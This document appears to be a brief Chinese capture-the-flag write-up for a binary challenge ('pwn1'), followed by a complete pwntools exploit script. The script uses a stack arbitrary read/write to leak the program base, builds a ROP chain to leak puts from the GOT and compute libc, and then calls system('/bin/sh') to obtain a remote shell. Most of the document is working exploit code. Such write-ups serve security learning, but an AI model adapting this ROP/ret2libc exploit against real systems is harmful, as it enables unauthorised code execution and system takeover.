有一个栈上的任意地址读写。

可以把当前的ebp+8读出来，就可以知道当前的程序的基址

把ebp+8的地方改成rop的地址，然后跳转call puts打印puts的got地址，就可以得到libc的基址，从而算出sys、binsh的基址。

然后再重复一遍以上操作，把ebp+8改成rop并跳转system('/bin/sh')就可以getsell了

```python
from pwn import *

debug = 0
if debug:
	p = process('./pwn1')
else:
	p = remote('', 57856)

context(log_level = 'debug')

def padd(times):
	for i in range(times):
		p.recvuntil('index')
		p.sendline('1')
		p.recvuntil('(hex)')
		p.sendline('1')

def Modify(pos, data):
	for i in range(pos,pos+8):
		p.recvuntil('index')
		p.sendline(str(i))
		p.recvuntil('(hex) ')
		p.sendline(str(data&0xff))
		data /= 0x100

p.recvuntil('name:')
p.sendline('1')

program_base = 0
rt = 1;
ti = 0
for i in range(344,352):
	p.recvuntil('index')
	p.sendline(str(i))
	p.recvuntil('(hex) ')
	tmp = int((p.recvuntil('\n', drop = True))[-2:], base = 16)
	print tmp
	program_base = (program_base+tmp*rt)
	rt = rt * 0x100
	p.sendline(str(tmp))
	ti +=1

program_base -= 0xb11

print(hex(program_base))

put_got = program_base + 0x202020
call_put = 0xC3E+program_base
#put_got = 0x2020A0
rdi = program_base + 0xd03
print hex((rdi&0xff00)/0x100)

p.recvuntil('index')
p.sendline('344')
p.recvuntil('(hex)')
p.sendline(str(3))

p.recvuntil('index')
p.sendline('345')
p.recvuntil('(hex)')
p.sendline(str((rdi&0xff00)/0x100))
ti+=2

Modify(352, put_got)
ti += 8

print(hex(put_got))

Modify(360, call_put)
ti += 8

Modify(632, program_base+0xb11) #0x120 offset
ti += 8

if debug:
	debugmsg = 'b* '+hex(program_base+0xC5C)
	gdb.attach(p, debugmsg)

padd(41-ti)
ti = 0

p.recvuntil('? \n')
sleep(0.2)
p.sendline('yes')
put_addr = u64(p.recv(6).ljust(8, '\x00'))
print hex(put_addr)
libc_base = put_addr - 0x06f690
print hex(libc_base)
sys_addr = libc_base + 0x045390
bin_sh = libc_base + 0x18cd57

p.sendline('yes\x00')

Modify(344, rdi)
Modify(352, bin_sh)
Modify(360, sys_addr)
ti = 24
padd(41 - ti)

p.recvuntil('? \n')
p.sendline('yes\x00')

p.interactive()
```

